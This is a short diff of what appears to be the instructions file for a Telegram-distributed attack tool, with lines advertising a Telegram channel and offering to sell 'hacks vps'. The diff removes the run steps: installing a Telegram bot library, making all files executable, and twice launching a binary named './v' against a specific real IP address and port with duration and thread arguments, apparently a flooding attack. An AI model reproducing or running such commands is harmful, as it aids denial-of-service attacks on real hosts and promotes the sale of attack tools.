@@ -17,7 +17,4 @@ Then delite terminal bash to stop attack
   -thankyou keep supporting
 Must join- venomCHA7.t.me
 Wanna buy hacks vps or anything dm - venomXcrazy.t.me
-pip install telebot
-chmod +x *
-./v 4.213.64.206 15787 300 300
-./v 4.213.64.206 15787 300 300
+
